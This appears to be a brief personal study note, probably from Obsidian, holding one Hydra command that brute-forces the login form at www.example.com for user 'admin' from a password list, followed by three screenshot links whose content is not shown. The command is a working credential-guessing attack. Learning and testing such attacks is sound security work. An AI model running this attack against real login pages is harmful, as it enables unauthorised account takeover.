___

```bash
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```


![[Pasted image 20241004131226.png]]

![[Pasted image 20241004131402.png]]

![[Pasted image 20241004131415.png]]





